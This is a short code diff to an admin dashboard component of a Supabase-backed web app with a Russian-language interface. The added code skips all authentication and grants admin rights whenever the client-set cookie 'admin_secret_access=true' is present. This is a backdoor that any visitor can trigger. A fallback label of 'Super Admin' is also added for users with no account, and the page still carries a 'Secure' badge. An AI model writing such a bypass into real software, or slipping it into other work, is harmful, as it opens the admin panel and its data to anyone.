@@ -31,6 +31,17 @@ export default function AdminDashboard() {
   const supabase = createClient()
 
   useEffect(() => {
+    // Check for secret cookie access first
+    const hasSecretAccess = document.cookie.includes('admin_secret_access=true')
+
+    if (hasSecretAccess) {
+      setIsAdmin(true)
+      setCheckingRole(false)
+      loadStats()
+      return
+    }
+
+    // Only check Supabase auth if no secret cookie
     if (!authLoading) {
       if (!user) {
         router.push('/admin/login')
@@ -194,7 +205,7 @@ export default function AdminDashboard() {
             <h2 className="text-2xl font-bold text-wood-900">Панель управления</h2>
           </div>
           <div className="text-right flex items-center gap-2">
-            <span className="hidden sm:inline text-sm text-wood-600">Администратор: {user?.email}</span>
+            <span className="hidden sm:inline text-sm text-wood-600">Администратор: {user?.email || 'Super Admin'}</span>
             <div className="bg-green-100 text-green-800 text-xs px-2 py-1 rounded-full flex items-center gap-1 font-bold">
               <Lock size={10} />
               Secure
